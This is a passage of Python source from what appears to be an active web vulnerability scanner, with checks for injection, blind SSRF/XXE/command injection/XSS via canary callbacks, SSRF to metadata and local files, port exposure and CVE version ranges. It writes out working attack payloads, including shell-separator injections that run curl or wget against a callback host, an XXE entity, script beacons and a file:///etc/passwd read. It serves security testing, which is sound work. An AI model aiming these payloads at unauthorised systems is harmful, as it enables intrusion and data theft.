                if sim < 0.55 and len(r.body) > len(bbody) * 1.3:
                    add(F("HIGH", f"NoSQL Injection (operator indication): {base} param '{pname}'",
                          f"The MongoDB operator value ($gt/$ne) drastically changes the result (similarity to baseline {sim:.2f}, response {len(r.body)} vs {len(bbody)} bytes) — indication that the NoSQL query accepts operators from input.",
                          evidence=f"payload={payload}", cwe="CWE-943",
                          owasp="A03:2021 Injection", cvss=8.1,
                          remed='Reject object/operator-typed values from input; sanitize $ and . in keys.',
                          confidence="probable", location=loc, param=pname))
                    break
    # ---------- XPath extra pass: GET parameters from the wider pool
    # (param_targets limit=60) that did not make the main injection list
    # (limit=30). Without this, an XPath endpoint linked late in the
    # crawl would never be XPath-tested at all — the round-robin target
    # merge starves late GET parameters when forms/guesses fill the
    # list. Bounded: at most 6 extra parameters, <=8 requests each;
    # SQL cannot have been proven on them (they were never in the main
    # list), so the structural-SQL gate passes False.
    _main_keys = {(b, p) for b, p, _m, _o in targets}
    _extra = 0
    for base, pname, method, orig in ctx.param_targets(limit=60):
        if _extra >= 6 or ctx.cancelled():
            break
        if method != "GET" or not orig or (base, pname) in _main_keys:
            continue
        _main_keys.add((base, pname))
        _extra += 1
        _br = ctx.client.get(orig)
        if _br.status not in (200, 500) or not _br.body:
            continue
        _bb = _br.body or ""
        _stable = similarity(
            _bb, ctx.client.get(orig).body or "") > 0.80

        def _Rx(value, _b=base, _p=pname, _o=orig):
            return ctx.req_param(_b, _p, value, "GET", _o)

        _xpath_probe(base, pname, _Rx, _bb, base, _stable, False,
                     "json" in (_br.hdr("content-type") or "").lower())


def c_crlf_injection(ctx, add):
    targets = ctx.param_targets(limit=14)
    mk = ctx.marker
    for base, pname, method, orig in targets:
        # Payload CRLF MENTAH: req_param meng-quote nilai, jadi bila di sini
        # dipakai bentuk ter-encode (%0d%0a) hasilnya double-encode dan CRLF
        # tidak pernah benar-benar terkirim — bug yang membuat check ini mati
        # total sampai ketahuan battery ground-truth v3.4.
        payload = f"x\r\nX-PTK-Injected: {mk}"
        r = ctx.req_param(base, pname, payload, method, orig)
        for k, v in r.headers:
            if k.lower() == "x-ptk-injected" and mk in v:
                add(F("HIGH", f"CRLF / Response Splitting: {base} param '{pname}'",
                      'A new header was successfully injected into the response via CRLF in the parameter.',
                      evidence=f"X-PTK-Injected: {v}", cwe="CWE-113",
                      owasp="A03:2021 Injection", cvss=7.4,
                      remed='Reject CR/LF in all input that goes into response headers.',
                      confidence="confirmed", location=base, param=pname))
                return
        for raw in r.hdr_all("set-cookie"):
            if mk in raw and "x-ptk" in raw.lower():
                add(F("HIGH", f"CRLF / Response Splitting: {base} param '{pname}'",
                      'Injected CRLF content appears in Set-Cookie.',
                      evidence=raw[:120], cwe="CWE-113", owasp="A03:2021", cvss=7.4,
                      remed='Reject CR/LF in input that goes into headers.',
                      confidence="confirmed", location=base, param=pname))
                return


def _oob_issue(ctx, reg, base, kind, loc, pname, payload_class):
    """Plant one token through the FORMAL registry (WS1): the token is
    issued with its full attribution record {scan_id, check, target,
    parameter, payload_class} and mirrored into ctx._oob_planted so the
    runner's grace-window finalize can re-poll exactly this scan's
    tokens. Returns (callback_url, entry)."""
    tok = reg.issue(f"{kind.lower()} {loc} {pname}", meta={
        "scan_id": ctx.scan_id, "check": "c_blind_oob", "target": loc,
        "parameter": pname, "payload_class": payload_class})
    entry = {"token": tok, "kind": kind, "location": loc, "param": pname,
             "check": "c_blind_oob", "payload_class": payload_class,
             "scan_id": ctx.scan_id}
    ctx._oob_planted.append(entry)
    ctx._oob_last_plant_ts = time.time()
    return reg.url(base, tok), entry


def _oob_emit(ctx, add, entry, hits):
    """Turn one planted token's real callback(s) into its finding. The
    finding exists ONLY because a callback arrived — that is the whole
    evidence model of this module."""
    tok, kind = entry["token"], entry["kind"]
    loc, pname = entry["location"], entry["param"]
    h = hits[0]
    ev = (f"canary callback from {h.get('ip')} ({h.get('method')} /{tok}) "
          f"UA: {h.get('user_agent', '')[:60]} — token registry: scan "
          f"{entry['scan_id']}, check {entry['check']}, class "
          f"{entry['payload_class']}"
          + (f", {len(hits)} callbacks total" if len(hits) > 1 else ""))
    if kind == "SSRF":
        add(F("CRITICAL", f"Blind SSRF confirmed via out-of-band callback: {loc} param '{pname}'",
              "The server fetched the unique canary URL planted in this parameter — server-side request forgery proven by an actual inbound callback, not by response inference. The fetcher can likely be pointed at internal services and cloud metadata.",
              evidence=ev, cwe="CWE-918", owasp="A10:2021 SSRF", cvss=9.1,
              remed="Whitelist destination hosts/schemes for server-side fetches; block private, loopback and metadata addresses.",
              confidence="confirmed", location=loc, param=pname))
    elif kind == "XXE":
        add(F("CRITICAL", f"Blind XXE confirmed via out-of-band callback: {loc}",
              "The XML parser resolved the external entity planted in the posted XML body and called the canary URL — XML External Entity processing is enabled on this endpoint.",
              evidence=ev, cwe="CWE-611", owasp="A05:2021 Security Misconfiguration", cvss=8.2,
              remed="Disable DTD/external entities in the XML parser (disallow DOCTYPE or external entity resolution).",
              confidence="confirmed", location=loc, param=""))
    elif kind == "CMDi":
        add(F("CRITICAL", f"Blind command injection confirmed via out-of-band callback: {loc} param '{pname}'",
              "A shell command separator planted in this parameter executed a command that fetched the unique canary URL — command injection proven by an actual inbound callback (no response or timing inference involved).",
              evidence=ev, cwe="CWE-78", owasp="A03:2021 Injection", cvss=9.8,
              remed="Never pass user input to a shell; use exec-with-argument-array APIs and a strict allowlist for values such as hosts/addresses.",
              confidence="confirmed", location=loc, param=pname))
    elif kind == "XSS":
        add(F("HIGH", f"Blind XSS confirmed via out-of-band callback: {loc}",
              "A script planted through this form was loaded from the canary origin — the stored content was rendered in a context that fetched the unique canary URL, proving stored script execution reaches a viewer's browser (or a server-side renderer). No callback would mean unproven, and none is claimed without one.",
              evidence=ev, cwe="CWE-79", owasp="A03:2021 Injection", cvss=6.1,
              remed="Contextually encode all user content on output; deploy a Content-Security-Policy that does not allow arbitrary script origins.",
              confidence="confirmed", location=loc, param=""))


def _oob_sweep(ctx, add):
    """Emit findings for every planted token of this scan that has
    callbacks and has not been reported yet. Returns the number of
    newly reported tokens. Used by c_blind_oob (initial pass) and by
    the runner's grace-window finalize (late callbacks)."""
    reg = (ctx.opts.get("canary") or {}).get("registry")
    if not reg:
        return 0
    n = 0
    for entry in ctx._oob_planted:
        if entry["token"] in ctx._oob_reported:
            continue
        try:
            hits = reg.hits(entry["token"])
        except Exception:
            hits = []
        if hits:
            ctx._oob_reported.add(entry["token"])
            _oob_emit(ctx, add, entry, hits)
            n += 1
    return n


_CMDI_PARAM_NAMES = {"host", "ip", "addr", "address", "cmd", "ping",
                     "target", "domain", "hostname", "server"}


def c_blind_oob(ctx, add):
    """Blind SSRF/XXE/CMDi/XSS via canary out-of-band (WS1, v1.4.0):
    tokens are planted through the formal per-scan registry (SSRF into
    URL parameters, XXE into XML bodies, blind CMDi into host-like
    parameters, blind XSS script beacons into stored-content forms).
    Findings are born ONLY from real callbacks recorded by the
    registry — no callback, no claim (blind means unproven, not safe).
    The runner re-polls after a grace window (default 60s) for late
    callbacks; an explicit '0 callbacks' note is recorded in the scan
    meta. Canary unavailable -> the check declares itself skipped."""
    can = ctx.opts.get("canary") or {}
    reg, base = can.get("registry"), can.get("base")
    if not reg or not base:
        ctx.L("  [oob] canary listener not configured — blind SSRF/XXE/CMDi/XSS "
              "skipped (declared, not assumed safe)")
        return
    planted0 = len(ctx._oob_planted)
    n_ssrf = 0
    for pth, pname, method, orig in ctx.param_targets(limit=40):
        if pname.lower() not in crawl_mod.URL_PARAM_NAMES:
            continue
        url, _e = _oob_issue(ctx, reg, base, "SSRF", pth, pname,
                             "url-parameter fetch")
        try:
            ctx.req_param(pth, pname, url, method, orig)
        except Exception:
            continue
        n_ssrf += 1
        if n_ssrf >= 4:
            break
    surf = ctx.surface()
    xxe_urls = []
    for form in surf.forms:
        if form.get("method", "GET").upper() == "POST":
            xxe_urls.append(form["action"])
    for pg in surf.pages:
        low = pg.lower()
        if any(k in low for k in ("xml", "soap", "wsdl")):
            xxe_urls.append(pg.split("?")[0])
    seen_u = set()
    n_xxe = 0
    for url in xxe_urls:
        if url in seen_u or n_xxe >= 3:
            continue
        seen_u.add(url)
        tok_url, _e = _oob_issue(ctx, reg, base, "XXE", url, "",
                                 "xml external entity")
        payload = ('<?xml version="1.0" encoding="UTF-8"?>'
                   '<!DOCTYPE r [<!ENTITY x SYSTEM "'
                   + tok_url + '">]><r>&x;</r>')
        try:
            ctx.client.post(url, data=payload,
                            headers={"Content-Type": "application/xml"})
        except Exception:
            continue
        n_xxe += 1
    # ---- blind CMDi: shell separators + a fetcher command per token,
    # so a callback identifies the exact form that executed.
    n_cmdi = 0
    for pth, pname, method, orig in ctx.param_targets(limit=60):
        if n_cmdi >= 4:
            break
        if pname.lower() not in _CMDI_PARAM_NAMES:
            continue
        host_val = orig if orig and re.fullmatch(r"[A-Za-z0-9.\-]{1,60}", orig or "") \
            else "127.0.0.1"
        for sep, tool in ((";", "curl -s"), ("|", "wget -qO-")):
            url, _e = _oob_issue(ctx, reg, base, "CMDi", pth, pname,
                                 f"shell separator '{sep}' + {tool.split()[0]}")
            try:
                ctx.req_param(pth, pname, f"{host_val}{sep}{tool} {url}",
                              method, orig)
            except Exception:
                continue
            n_cmdi += 1
    # ---- blind XSS: script beacons stored via non-auth forms; the
    # pages are re-visited afterwards (victim-view trigger for
    # server-side renderers). A callback means a browser/renderer
    # actually loaded the beacon.
    n_xss = 0
    for form in surf.forms:
        if n_xss >= 3:
            break
        if form.get("method", "GET").upper() != "POST":
            continue
        action = form.get("action") or ""
        low = action.lower()
        if any(k in low for k in ("login", "auth", "register", "signup",
                                  "sign-up", "password")):
            continue
        fields = []
        for inp in form.get("inputs", []):
            # Crawler input records come in two shapes: dicts
            # {"name", "type"} and bare name strings.
            if isinstance(inp, str):
                nm, itype = inp.strip(), "text"
            elif isinstance(inp, dict):
                nm = (inp.get("name") or "").strip()
                itype = (inp.get("type") or "text").lower()
            else:
                continue
            if not nm:
                continue
            low_nm = nm.lower()
            if any(k in low_nm for k in ("pass", "email", "token", "csrf")):
                continue
            if itype in ("hidden", "file", "submit", "button",
                         "checkbox", "radio"):
                continue
            fields.append(nm)
        if not fields:
            continue
        url, _e = _oob_issue(ctx, reg, base, "XSS", action, fields[0],
                             "stored script beacon")
        data = {nm: "fixture text" for nm in fields}
        data[fields[0]] = f'<script src="{url}"></script>'
        if len(fields) > 1:
            data[fields[1]] = f'<img src="{url}">'
        try:
            # the client sends `data` verbatim — form-encode it here
            ctx.client.post(action, data=urlencode(data))
        except Exception:
            continue
        n_xss += 1
        for view in (form.get("page") or "", action):
            if view:
                try:
                    # Fresh fetch (verify header taints the client GET
                    # cache): a cached pre-plant body would never make
                    # the target render the beacon.
                    ctx.client.get(view, headers=_VERIFY_HDR)
                except Exception:
                    pass
    planted = ctx._oob_planted[planted0:]
    if not planted:
        ctx.L("  [oob] no suitable SSRF/XXE/CMDi/XSS injection points found")
        return
    ctx.L(f"  [oob] {len(planted)} canary tokens planted "
          f"({n_ssrf} SSRF, {n_xxe} XXE, {n_cmdi} CMDi, {n_xss} XSS) — "
          "waiting for callbacks")
    time.sleep(3.0)
    confirmed = _oob_sweep(ctx, add)
    ctx.L(f"  [oob] callbacks confirmed: {confirmed}/{len(planted)} planted "
          f"tokens (grace-window re-poll at end of scan: "
          f"{ctx.canary_grace_s:.0f}s)")


def c_ssrf(ctx, add):
    """SSRF: (1) cloud metadata signature = confirmed; (2) oracle fetch internal:
    server diminta fetch URL 127.0.0.1 ke port target sendiri — bila konten homepage
    internal muncul di respons padahal baseline tidak, fetch sisi-server terbukti."""
    home = ctx.client.get("/")
    home_sig = ""
    m = re.search(r"<title>([^<]{4,80})</title>", home.body or "", re.I)
    if m:
        home_sig = m.group(1).strip()
    meta = "http://169.254.169.254/latest/meta-data/"
    # Budget besar + filter nama di depan: limit kecil membuat parameter URL
    # asli (mis. /fetch?url=) kelaparan di belakang parameter lain (bug
    # starvation yang sama seperti injeksi v3.4, kini untuk SSRF).
    tested = 0
    for base, pname, method, orig in ctx.param_targets(limit=40):
        if pname.lower() not in crawl_mod.URL_PARAM_NAMES:
            continue
        tested += 1
        if tested > 6:
            break
        # v3.7: buktikan SEMUA vektor SSRF pada parameter ini (file://,
        # metadata, fetch internal) dan lanjut ke parameter URL berikutnya —
        # jangan berhenti di bukti/parameter pertama.
        hit = False
        rf = ctx.req_param(base, pname, "file:///etc/passwd", method, orig)
        if re.search(r"root:.*?:0:0:", rf.body or ""):
            add(F("CRITICAL", f"SSRF/LFI via file:// scheme: {base} param '{pname}'",
                  'The URL parameter accepts the file:// scheme and returns the contents of /etc/passwd — the server-side fetcher does not validate the scheme/destination.',
                  evidence='signature /etc/passwd from file:///etc/passwd', cwe="CWE-918",
                  owasp="A10:2021 SSRF", cvss=9.1,
                  remed='Whitelist the http/https schemes + destination hosts; block file/gopher/dict.',
                  confidence="confirmed", location=base, param=pname))
            hit = True
        r = ctx.req_param(base, pname, meta, method, orig)
        body = r.body or ""
        if re.search(r"ami-id|instance-id|instance-type|iam/security-credentials", body):
            add(F("CRITICAL", f"SSRF to cloud metadata: {base} param '{pname}'",
                  'The server fetched and displayed cloud instance metadata (169.254.169.254) — instance credentials could be leaked.',
                  evidence='cloud metadata signature in the response', cwe="CWE-918",
                  owasp="A10:2021 SSRF", cvss=9.1,
                  remed='Block the metadata IP & private addresses from the fetcher; whitelist destination hosts.',
                  confidence="confirmed", location=base, param=pname))
            hit = True
        if home_sig:
            port = ctx.client.port
            internal = f"http://127.0.0.1:{port}/"
            r2 = ctx.req_param(base, pname, internal, method, orig)
            base_r = ctx.req_param(base, pname, "1", method, orig)
            if home_sig in (r2.body or "") and home_sig not in (base_r.body or ""):
                add(F("HIGH", f"SSRF (internal fetch proven): {base} param '{pname}'",
                      f"The URL parameter makes the server fetch content from 127.0.0.1 (internal homepage title '{home_sig[:40]}' appears in the response).",
                      evidence=f"fetch {internal} -> internal content reflected",
                      cwe="CWE-918", owasp="A10:2021 SSRF", cvss=8.6,
                      remed='Whitelist fetch destination hosts; block private/loopback addresses.',
                      confidence="probable", location=base, param=pname))
                hit = True


def c_host_header(ctx, add):
    evil = f"evil-{ctx.marker}.example.com"
    r = ctx.client.get("/", headers={"X-Forwarded-Host": evil})
    if r.status and evil in (r.body or ""):
        add(F("MEDIUM", 'X-Forwarded-Host reflected into the page',
              'An attacker-controlled header is reflected — host-header injection indication (e.g. in password reset links).',
              evidence=evil, cwe="CWE-644", owasp="A05:2021", cvss=5.9,
              remed='Whitelist the Host header; ignore X-Forwarded-Host from clients.',
              confidence="confirmed", location="/"))


# ------------------------------------------------------------ active: services & CVE

RISKY_PORTS = {
    23: ("CRITICAL", "CWE-319", 9.8, 'Telnet open', "Matikan telnet; pakai SSH."),
    21: ("HIGH", "CWE-319", 7.5, 'FTP open', 'Use SFTP/FTPS; close port 21.'),
    3389: ("HIGH", "CWE-284", 8.6, 'RDP exposed', 'Restrict via VPN/firewall; enable NLA + MFA.'),
    445: ("HIGH", "CWE-284", 8.6, 'SMB exposed to the public', 'Block 445 from the internet.'),
    6379: ("CRITICAL", "CWE-306", 9.8, 'Redis open', "Set requirepass + bind 127.0.0.1."),
    27017: ("CRITICAL", "CWE-306", 9.8, 'MongoDB open', 'Enable auth + bind internally.'),
    27018: ("CRITICAL", "CWE-306", 9.8, 'MongoDB (shard) open', 'Enable auth + bind internally.'),
    11211: ("HIGH", "CWE-306", 8.6, 'Memcached open', 'Bind internally; block from the public.'),
    3306: ("MEDIUM", "CWE-284", 5.9, 'MySQL exposed', 'Bind internally; use an SSH tunnel.'),
    5432: ("MEDIUM", "CWE-284", 5.9, 'PostgreSQL exposed', 'Bind internally.'),
    5900: ("HIGH", "CWE-284", 8.6, 'VNC open', "Tunnel via VPN; pakai auth kuat."),
    161: ("MEDIUM", "CWE-200", 5.3, 'SNMP open', "Ganti community string default; pakai SNMPv3."),
    1723: ("MEDIUM", "CWE-319", 6.5, 'PPTP VPN open', "Migrate to WireGuard/OpenVPN."),
    9200: ("HIGH", "CWE-306", 8.6, 'Elasticsearch exposed', 'Enable security; bind internally.'),
    2375: ("CRITICAL", "CWE-306", 9.8, 'Docker API (without TLS) exposed', "Jangan expose 2375; pakai socket lokal/SSH."),
    2379: ("HIGH", "CWE-306", 8.6, 'etcd exposed', 'Enable auth + TLS; bind internally.'),
    6443: ("MEDIUM", "CWE-284", 5.9, 'Kubernetes API exposed', 'Restrict API server access sources.'),
    10250: ("HIGH", "CWE-306", 8.6, 'kubelet API exposed', 'Enable kubelet auth; bind internally.'),
    15672: ("MEDIUM", "CWE-284", 5.3, 'RabbitMQ management exposed', 'Restrict via VPN/firewall.'),
    5601: ("MEDIUM", "CWE-284", 5.3, 'Kibana exposed', 'Require authentication; restrict the network.'),
    1433: ("MEDIUM", "CWE-284", 5.9, 'Microsoft SQL Server exposed', 'Bind internally; do not expose to the internet.'),
    1521: ("MEDIUM", "CWE-284", 5.9, 'Oracle Database exposed', 'Bind internally.'),
    2049: ("HIGH", "CWE-284", 8.6, 'NFS exposed', 'Restrict NFS exports to trusted hosts only.'),
    389: ("LOW", "CWE-200", 3.7, 'LDAP exposed', 'Consider LDAPS + authentication; restrict the network.'),
    5985: ("MEDIUM", "CWE-319", 6.5, 'WinRM HTTP exposed', 'Use WinRM HTTPS (5986) and restrict sources.'),
    4848: ("MEDIUM", "CWE-284", 5.3, 'GlassFish admin exposed', 'Restrict the admin console to the internal network.'),
    8086: ("MEDIUM", "CWE-306", 6.5, 'InfluxDB exposed', 'Enable InfluxDB auth; bind internally.'),
    9000: ("MEDIUM", "CWE-284", 5.3, 'Administrative HTTP service exposed (9000)', 'Verify the service on this port; restrict the network.'),
}


def c_services(ctx, add):
    host = ctx.client.host
    det = tcp_scan_detailed(host, COMMON_PORTS)
    open_ports = det["open"]
    ctx.L(f"  [services] open port: {[p['port'] for p in open_ports] or '-'} (verified: {[p['port'] for p in open_ports if p.get('verified')] or '-'})")
    if det["intercepted"]:
        # Jalur egress menjawab SEMUA port (gateway/tarpit): hasil port BUKAN
        # cerminan target. Nyatakan tidak konklusif — jangan buat temuan port.
        add(F("INFO", 'Port scan INCONCLUSIVE — TCP connection intercepted on the egress path',
              f"The TCP connection to the target is answered by a third party on the network path ({det['intercept_reason']}), so the port status does not reflect the target at all. A port scan is only valid from a network without an interceptor.",
              evidence=(det["banner_sample"] or "")[:140], cwe="CWE-200",
              owasp="A05:2021 Security Misconfiguration", cvss=0.0,
              remed="Repeat the port scan from a clean vantage point (e.g. the auditor's host directly); ignore this port run's results.",
              confidence="confirmed", location=""))
        ctx.L('  [services] INTERCEPTED — port scan declared inconclusive')
        return
    unverified_risky = []
    for p in open_ports:
        port = p["port"]
        if port not in RISKY_PORTS:
            continue
        if p.get("verified"):
            sev, cwe, cvss, title, remed = RISKY_PORTS[port]
            add(F(sev, f"{title} (port {port}/tcp)", remed,
                  evidence=(p["banner"] or 'protocol probe verified')[:140],
                  cwe=cwe, owasp="A05:2021 Security Misconfiguration", cvss=cvss,
                  remed=remed, confidence="confirmed", location=f":{port}"))
        else:
            unverified_risky.append(port)
    if unverified_risky:
        lst = ", ".join(str(x) for x in sorted(unverified_risky))
        add(F("LOW", f"Risky ports detected via TCP connect (not yet verified): {lst}",
              'These ports accept TCP connections but their responses do NOT match the claimed service signatures — this may indicate a tarpit/firewall, a non-standard service, or the actual service with a custom banner. They must not be reported as confirmed services before manual verification.',
              evidence='TCP connect succeeded; protocol signature does not match',
              cwe="CWE-200", owasp="A05:2021 Security Misconfiguration", cvss=3.7,
              remed='Verify each port manually (nmap -sV from a clean network); close unneeded ports.',
              confidence="candidate", location=""))
    # --- verifikasi API service tanpa autentikasi (HTTP, port non-web utama)
    probes = [
        (2375, "/version", r'"Version"\s*:|"ApiVersion"', "CRITICAL",
         'Docker API accessible WITHOUT authentication', "CWE-306", 9.8,
         'Immediately close 2375 from the public network; access Docker via socket/SSH only.'),
        (9200, "/", r'"cluster_name"|"tagline"\s*:\s*"You Know, for Search"', "HIGH",
         'Elasticsearch accessible WITHOUT authentication', "CWE-306", 8.6,
         'Enable X-Pack security; bind internally.'),
        (2379, "/version", r'"etcdserver"|"etcdcluster"', "HIGH",
         'etcd accessible WITHOUT authentication', "CWE-306", 8.6,
         "Enable etcd auth + TLS."),
        (10250, "/healthz", r"^ok$", "MEDIUM",
         'kubelet API responds without authentication (healthz)', "CWE-306", 6.5,
         'Enable kubelet authentication/authorization.'),
    ]
    open_set = {p["port"] for p in open_ports if p.get("verified")}
    import http.client as _hc
    for port, path, sig, sev, title, cwe, cvss, remed in probes:
        if port not in open_set or ctx.cancelled():
            continue
        try:
            conn = _hc.HTTPConnection(host, port, timeout=4)
            conn.request("GET", path, headers={"User-Agent": "VANTHEX/1.9.0"})
            r = conn.getresponse()
            body = r.read(20000).decode("utf-8", "replace")
            conn.close()
            if r.status == 200 and re.search(sig, body):
                add(F(sev, f"{title} (port {port})",
                      'The HTTP probe to the service API succeeded without any credentials and the response passed the product signature check.',
                      evidence=body[:140].replace("\n", " "), cwe=cwe,
                      owasp="A05:2021", cvss=cvss, remed=remed,
                      confidence="confirmed", location=f":{port}{path}"))
        except Exception:
            pass


# Kandidat CVE berbasis versi ter-fingerprint — SELALU confidence=candidate.
CVE_CANDIDATES = [
    ("Apache", "2.4.49", "CVE-2021-41773", "CRITICAL", 9.8,
     'Apache 2.4.49 is vulnerable to path traversal/RCE (CVE-2021-41773). A separate active probe will attempt to confirm it.'),
    ("Apache", "2.4.50", "CVE-2021-42013", "CRITICAL", 9.8,
     'Apache 2.4.50 is vulnerable to the CVE-2021-42013 traversal variant.'),
    ("WordPress", None, None, "INFO", 0.0, None),  # placeholder, di-skip (perlu versi persis < terbaru)
    ("PHP", "7.4.3", "CVE-2020-7064", "MEDIUM", 5.4,
     'PHP 7.4.3 has known CVEs (e.g. CVE-2020-7064) — verify the vendor changelog.'),
    ("nginx", "1.20.0", "CVE-2021-23017", "HIGH", 7.7,
     'nginx 1.20.0 is vulnerable to CVE-2021-23017 (DNS resolver off-by-one).'),
    ("IIS", "7.5", "CVE-2015-1635", "HIGH", 7.4,
     'IIS 7.5 is vulnerable to HTTP.sys RCE CVE-2015-1635 if unpatched.'),
]


# Tabel CVE berbasis RENTANG versi (v1.1) — melengkapi CVE_CANDIDATES
# (exact match). Spec: klausul dipisah koma, operator ==, <, <=, >, >=.
# Semua entri adalah CVE nyata yang terkenal; status tetap CANDIDATE.
CVE_RANGES = [
    ("nginx", ">=0.6.18,<=1.20.0", "CVE-2021-23017", "HIGH", 7.7,
     "nginx resolver off-by-one (CVE-2021-23017) affects 0.6.18-1.20.0."),
    ("Microsoft IIS", "==7.5", "CVE-2015-1635", "HIGH", 7.4,
     "IIS 7.5 is vulnerable to HTTP.sys RCE CVE-2015-1635 if unpatched."),
    ("jQuery", "<3.0.0", "CVE-2015-9251", "MEDIUM", 6.1,
     "jQuery before 3.0.0 is vulnerable to XSS via cross-domain Ajax responses (CVE-2015-9251)."),
    ("jQuery", "<3.4.0", "CVE-2019-11358", "MEDIUM", 6.1,
     "jQuery before 3.4.0 is vulnerable to prototype pollution via $.extend (CVE-2019-11358)."),
    ("jQuery", "<3.5.0", "CVE-2020-11022", "MEDIUM", 6.1,
     "jQuery before 3.5.0 may execute untrusted HTML in DOM manipulation methods (CVE-2020-11022)."),
    ("WordPress", "<5.8.3", "CVE-2022-21661", "HIGH", 7.5,
     "WordPress before 5.8.3 is vulnerable to SQL injection via WP_Query (CVE-2022-21661)."),
    ("GitLab", ">=11.9,<13.10.3", "CVE-2021-22205", "CRITICAL", 10.0,
     "GitLab CE/EE in this range is vulnerable to the ExifTool unauthenticated RCE (CVE-2021-22205); per-branch fixes: 13.10.3 / 13.9.6 / 13.8.8."),
    # --- WS4 (v1.10.0): rentang terkurasi lintas ekosistem. Semua tetap
    # CANDIDATE; syarat yang tidak bisa diverifikasi dari URL ditulis
    # eksplisit di teks kandidatnya.
    ("Tomcat", ">=9.0.0,<9.0.31", "CVE-2020-1938", "HIGH", 7.5,
     "Tomcat in the Ghostcat (CVE-2020-1938) AJP file-read range. Preconditions NOT verifiable from the scanned URL: the AJP connector (port 8009) must be enabled and reachable. Version range only — verify manually."),
    ("Tomcat", ">=8.5.0,<8.5.51", "CVE-2020-1938", "HIGH", 7.5,
     "Tomcat in the Ghostcat (CVE-2020-1938) AJP file-read range. Preconditions NOT verifiable from the scanned URL: the AJP connector (port 8009) must be enabled and reachable. Version range only — verify manually."),
    ("Tomcat", ">=7.0.0,<7.0.100", "CVE-2020-1938", "HIGH", 7.5,
     "Tomcat in the Ghostcat (CVE-2020-1938) AJP file-read range. Preconditions NOT verifiable from the scanned URL: the AJP connector (port 8009) must be enabled and reachable. Version range only — verify manually."),
    ("Tomcat", ">=11.0.0,<=11.0.2", "CVE-2025-24813", "HIGH", 8.6,
     "Tomcat in the CVE-2025-24813 range (partial PUT + session deserialization RCE). Preconditions NOT verifiable from the scanned URL: writes enabled for the default servlet (partial PUT) AND file-based session persistence in use. Version range only — verify manually."),
    ("Tomcat", ">=10.1.0,<=10.1.34", "CVE-2025-24813", "HIGH", 8.6,
     "Tomcat in the CVE-2025-24813 range (partial PUT + session deserialization RCE). Preconditions NOT verifiable from the scanned URL: writes enabled for the default servlet (partial PUT) AND file-based session persistence in use. Version range only — verify manually."),
    ("Tomcat", ">=9.0.0,<=9.0.98", "CVE-2025-24813", "HIGH", 8.6,
     "Tomcat in the CVE-2025-24813 range (partial PUT + session deserialization RCE). Preconditions NOT verifiable from the scanned URL: writes enabled for the default servlet (partial PUT) AND file-based session persistence in use. Version range only — verify manually."),
    ("Jetty", ">=9.4.0,<9.4.41", "CVE-2021-28169", "MEDIUM", 5.3,
     "Jetty in the CVE-2021-28169 range: encoded-slash requests can expose WEB-INF resources. Version range only — verify manually."),
    ("Jetty", ">=10.0.0,<10.0.3", "CVE-2021-28169", "MEDIUM", 5.3,
     "Jetty in the CVE-2021-28169 range: encoded-slash requests can expose WEB-INF resources. Version range only — verify manually."),
    ("Jetty", ">=11.0.0,<11.0.3", "CVE-2021-28169", "MEDIUM", 5.3,
     "Jetty in the CVE-2021-28169 range: encoded-slash requests can expose WEB-INF resources. Version range only — verify manually."),
    ("Spring Boot", ">=2.6.0,<2.6.6", "CVE-2022-22965", "CRITICAL", 9.8,
     "Spring4Shell (CVE-2022-22965) applies via the Spring Framework bundled by Spring Boot 2.6.0-2.6.5 (Framework 5.3.0-5.3.17). Preconditions NOT verifiable from the scanned URL: JDK 9+, WAR deployment on Tomcat, spring-webmvc in use, and a DataBinder-bound controller endpoint. Version range only — verify manually."),
    ("Spring Boot", ">=2.5.0,<2.5.12", "CVE-2022-22965", "CRITICAL", 9.8,
     "Spring4Shell (CVE-2022-22965) applies via the Spring Framework bundled by Spring Boot 2.5.0-2.5.11 (Framework 5.2.0-5.2.19). Preconditions NOT verifiable from the scanned URL: JDK 9+, WAR deployment on Tomcat, spring-webmvc in use, and a DataBinder-bound controller endpoint. Version range only — verify manually."),
    ("Express (Node.js)", "<4.20.0", "CVE-2024-43796", "MEDIUM", 6.1,
     "Express before 4.20.0 does not properly sanitize untrusted input passed to response.redirect() (CVE-2024-43796), enabling XSS when user input reaches a redirect. Version range only — verify manually."),
    ("Next.js", ">=11.1.4,<12.3.5", "CVE-2025-29927", "HIGH", 9.1,
     "Next.js in the CVE-2025-29927 middleware authorization bypass range (x-middleware-subrequest header). Preconditions NOT verifiable from the scanned URL: self-hosted deployment relying on middleware for authorization (not Vercel, not static export). Version range only — verify manually."),
    ("Next.js", ">=13.0.0,<13.5.9", "CVE-2025-29927", "HIGH", 9.1,
     "Next.js in the CVE-2025-29927 middleware authorization bypass range (x-middleware-subrequest header). Preconditions NOT verifiable from the scanned URL: self-hosted deployment relying on middleware for authorization (not Vercel, not static export). Version range only — verify manually."),
    ("Next.js", ">=14.0.0,<14.2.25", "CVE-2025-29927", "HIGH", 9.1,
     "Next.js in the CVE-2025-29927 middleware authorization bypass range (x-middleware-subrequest header). Preconditions NOT verifiable from the scanned URL: self-hosted deployment relying on middleware for authorization (not Vercel, not static export). Version range only — verify manually."),
    ("Next.js", ">=15.0.0,<15.2.3", "CVE-2025-29927", "HIGH", 9.1,
     "Next.js in the CVE-2025-29927 middleware authorization bypass range (x-middleware-subrequest header). Preconditions NOT verifiable from the scanned URL: self-hosted deployment relying on middleware for authorization (not Vercel, not static export). Version range only — verify manually."),
    ("Laravel", ">=8.0.0,<8.4.2", "CVE-2021-3129", "CRITICAL", 9.8,
     "Laravel in the CVE-2021-3129 range (Ignition RCE). Preconditions NOT verifiable from the scanned URL: the facade/ignition debug package installed AND APP_DEBUG enabled. Version range only — verify manually."),
    ("Drupal", ">=7.0.0,<7.58", "CVE-2018-7600", "CRITICAL", 9.8,
     "Drupal in the Drupalgeddon2 range (CVE-2018-7600): unauthenticated RCE in core render API handling. Version range only — verify manually."),
    ("Drupal", ">=8.4.0,<8.4.6", "CVE-2018-7600", "CRITICAL", 9.8,
     "Drupal in the Drupalgeddon2 range (CVE-2018-7600): unauthenticated RCE in core render API handling. Version range only — verify manually."),
    ("Drupal", ">=8.5.0,<8.5.1", "CVE-2018-7600", "CRITICAL", 9.8,
     "Drupal in the Drupalgeddon2 range (CVE-2018-7600): unauthenticated RCE in core render API handling. Version range only — verify manually."),
    ("Django", ">=3.2.0,<3.2.4", "CVE-2021-35042", "HIGH", 8.9,
     "Django in the CVE-2021-35042 range: SQL injection via unsanitized ordering input in QuerySet.order_by(). Preconditions NOT verifiable from the scanned URL: an endpoint must pass user input into order_by. Version range only — verify manually."),
